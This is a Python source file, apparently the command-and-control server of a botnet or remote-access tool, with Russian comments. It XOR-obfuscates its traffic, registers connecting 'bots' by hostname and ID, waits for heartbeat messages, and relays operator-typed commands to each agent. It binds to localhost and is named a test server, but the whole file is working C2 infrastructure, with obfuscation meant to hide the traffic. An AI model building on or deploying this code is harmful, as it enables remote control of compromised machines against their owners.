# test_server.py — ОПТИМИЗИРОВАННЫЙ (Быстрый и удобный)
import socket
import threading
import time
import uuid
import sys

XOR_KEY = 0xAA

def xor_data(data):
    return bytes([b ^ XOR_KEY for b in data])

def handle_client(conn, addr):
    print(f"\n[+] Connection from {addr}")
    try:
        # Handshake
        buf = conn.recv(1024)
        if not buf: return
        msg = xor_data(buf).decode().strip()
        print(f"  [RX] {msg}")
        if msg == "HELLO":
            conn.sendall(xor_data(b"ACK\n"))
        
        buf = conn.recv(1024)
        msg = xor_data(buf).decode().strip()
        print(f"  [RX] {msg}")
        hostname = msg.split("REGISTER:")[1] if "REGISTER:" in msg else "Unknown"
        
        bot_id = str(uuid.uuid4())
        conn.sendall(xor_data((f"ID:{bot_id}\n").encode()))
        print(f"[+] Bot Registered: {hostname} (ID: {bot_id})")
        print("[*] Type command and press Enter. (Type 'quit' to exit)\n")

        # Loop
        while True:
            # Ждем данные от агента (BEAT)
            try:
                buf = conn.recv(1024)
                if not buf:
                    print("[!] Connection lost.")
                    break
                
                rx_msg = xor_data(buf).decode().strip()
                print(f"  [RX] {rx_msg}")
                
                # Как только получили BEAT (или ответ), сразу просим команду
                # Используем input() — он блочит, но сервер однопоточный на клиента, так что ок
                cmd = input("  [CMD] > ")
                if cmd.lower() == 'quit': break
                
                # Отправляем команду
                conn.sendall(xor_data((cmd + "\n").encode()))
                
            except ConnectionResetError:
                print("[!] Connection closed by agent.")
                break
            except Exception as e:
                print(f"[!] Error: {e}")
                break
    finally:
        conn.close()

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('127.0.0.1', 12345))
    s.listen(1)
    print("[Server] Listening on 127.0.0.1:12345")
    
    while True:
        try:
            conn, addr = s.accept()
            threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()
        except KeyboardInterrupt:
            break

if __name__ == "__main__":
    main()